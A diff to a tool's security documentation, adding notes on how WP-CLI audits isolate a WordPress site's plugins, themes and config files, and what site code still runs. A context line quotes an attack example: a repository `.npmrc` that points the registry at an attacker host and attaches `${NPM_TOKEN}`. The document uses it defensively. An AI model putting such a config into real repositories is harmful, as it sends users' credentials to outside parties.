@@ -508,6 +508,21 @@ their respective projects.
   was started with reaches it. It is still the repository's code, running as
   you, with your files: run `create_fix_pr` only on a repository whose tests
   you would run yourself.
+- **WP-CLI boots the site it audits — without its plugins and theme.**
+  `wp_audit` (every mode), `wp_report`'s plugin kind and `wp_vuln_check` with
+  an install path run WP-CLI, which runs the site's PHP to answer from its
+  database. Every call passes `--skip-plugins --skip-themes`, names the site
+  with `--path` and starts in a temporary directory of its own holding an
+  empty `wp-cli.yml` — so the site's `wp-cli.yml` / `wp-cli.local.yml`, whose
+  `require:` WP-CLI would load as PHP, is never read — and gets the test
+  command's allowlisted environment above plus `WP_CLI_*`, `PHPRC`,
+  `PHP_INI_SCAN_DIR` and the proxy variables (`mcp/src/wordpress/wpCli.ts`).
+  What WP-CLI cannot skip still runs: the site's `wp-config.php` (`wp config
+  get` evaluates it too), its WordPress core files, its must-use plugins and
+  its drop-ins (`wp-content/db.php`, `object-cache.php`,
+  `advanced-cache.php`). On a site copied off a compromised server those may
+  be altered too: read its code first (`scan_wordpress`), and run the WP-CLI
+  audits only on a copy you would let boot.
 - **A repository never chooses where `create_fix_pr`'s package managers send
   your credentials.** A repository `.npmrc` with `registry=https://attacker/`
   and `//attacker/:_authToken=${NPM_TOKEN}` made `npm outdated`, `npm ci`,
